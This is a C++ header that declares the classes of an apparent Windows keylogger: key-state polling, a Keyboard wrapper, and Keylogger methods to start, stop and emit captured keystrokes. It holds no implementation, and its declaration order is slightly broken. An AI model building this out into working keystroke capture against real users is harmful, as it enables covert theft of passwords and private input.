#pragma once
#include <windows.h>
#include <string>
#include <thread>

#define PRESSED 0x8000
#define TOGGLED 0x0001
#define CHARTOLOWER 32

typedef std::chrono::milliseconds milliseconds;
#define sleep(time) std::this_thread::sleep_for(time)

class Key {
	private:
	SHORT state;
	bool alternating;

	public:
	const BYTE value;
	const std::string description;
	
	Key(BYTE value, std::string description);

	bool isPressed();
	bool isTriggered();
	bool isToggled();

	friend class Keylogger;
};

class Keyboard {
	private:
	Key** keys;

	public:
	milliseconds polling;
	Keylogger* keylogger;

	Keyboard();

	Key** getKeys() const;
	
	static std::string describeKey(BYTE vk);

	friend class Keylogger;
};

class Keylogger {
	private:
	Keyboard* keyboard;
	std::thread* keylog;

	void setKeysState();
	template<typename T> static void showOutput(T output);

	public:
	Keylogger(Keyboard* keyboard);

	void startKeylog();
	bool isKeylogging() const;
	void stopKeylog();

	void getOutput();
	static void handleOutput(char output);
	static void handleOutput(std::string output);
};